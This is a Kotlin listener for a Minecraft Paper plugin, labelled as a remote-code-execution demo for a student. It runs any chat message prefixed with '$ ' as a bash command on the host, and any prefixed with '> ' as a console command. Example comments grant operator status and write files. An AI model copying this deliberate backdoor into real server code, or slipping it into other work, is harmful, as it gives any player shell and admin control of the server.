package org.doomlabs.crystal.msp.event

import io.papermc.paper.event.player.AsyncChatEvent
import org.bukkit.Bukkit
import org.bukkit.event.EventHandler
import org.bukkit.event.Listener
import org.doomlabs.crystal.msp.util.runBukkit
import org.doomlabs.crystal.msp.util.text

/**
 * Simple RCE Vuln. Demo for my Student ^^
 *
 * Minecraft Command Execution:
 * ```
 * /gamemode creative
 * > op Douumaa
 * /gamemode creative
 * ```
 *
 * Bash Command Execution:
 * ```
 * $ ls
 * $ echo "Hackerman!" > i-was-here.txt
 * ```
 */
@Suppress("SpellCheckingInspection")
object RCEDemo: Listener {
    @EventHandler
    fun onChatMessage(event: AsyncChatEvent) {
        val text = event.message().text()

        val hostPrefix = "$ "
        val mcPrefix = "> "
        if(text.startsWith(hostPrefix)) {
            event.isCancelled = true

            val command = text.substring(hostPrefix.length)
            if(command == "clear") {
                for(i in 0..64) event.player.sendMessage("")
            } else {
                val process = Runtime.getRuntime().exec("bash -c \"$command\"")
                val output = process.inputStream.bufferedReader().readText()

                event.player.sendMessage(output)
            }
        } else if(text.startsWith(mcPrefix)) {
            event.isCancelled = true

            val command = text.substring(mcPrefix.length)
            runBukkit { Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command) }
        }
    }
}